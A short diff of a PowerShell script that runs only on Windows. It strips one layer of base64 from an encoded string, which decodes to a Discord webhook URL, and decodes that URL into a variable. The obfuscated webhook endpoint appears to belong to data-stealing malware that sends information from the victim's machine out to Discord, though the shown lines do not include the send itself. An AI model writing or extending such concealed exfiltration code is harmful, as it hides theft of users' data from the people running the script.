@@ -1,8 +1,6 @@
 if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") { exit }
 
-$b64_tier2 = "YUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVFE1TVRreE5UY3dNell5TWpnek1qSXlPQzlFYTFsYWNrUndNMUpKY1ZJd1ZWaDFTa2hCU1VSYWRrbHJYMTluVmswelUyOVdNbVUzUVdac1oweEVUWFJDUlRWM1QyWm9ZbUp2WW5sUWNIQlBMVTlVTmpjamFRPT0="
-
-$b64_tier1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier2))
+$b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MTkxNTcwMzYyMjgzMjIyOC9Ea1lackRwM1JJcVIwVVh1SkhBSURadklrX19nVk0zU29WMmU3QWZsZ0xETXRCRTV3T2ZoYmJvYnlQcHBPLU9UNjdjaQ=="
 
 $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
 
